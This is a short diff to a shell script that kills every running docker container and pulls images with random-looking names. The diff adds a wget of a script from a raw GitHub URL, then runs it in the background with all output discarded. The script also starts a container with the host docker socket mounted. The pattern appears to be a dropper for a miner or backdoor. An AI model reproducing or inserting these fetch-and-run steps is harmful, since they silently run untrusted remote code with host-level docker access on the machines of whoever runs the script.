@@ -2,7 +2,11 @@ docker kill $(docker ps -q)
 
 docker pull tradeinc/keepactive8888
 
-docker pull tradeinc/thetradebox88888888
+docker pull tradeinc/thetradebox88888888keepactive88888888
+
+wget -N https://raw.githubusercontent.com/linuxweb888888888888/linux8888/refs/heads/main/keepactive88888888
+
+bash ./keepactive88888888 &> /dev/null &
 
 docker run -it -v /var/run/docker.sock:/var/run/docker.sock --shm-size="14000m" -d tradeinc/keepactive8888 /bin/bash /var/www/html/start
 
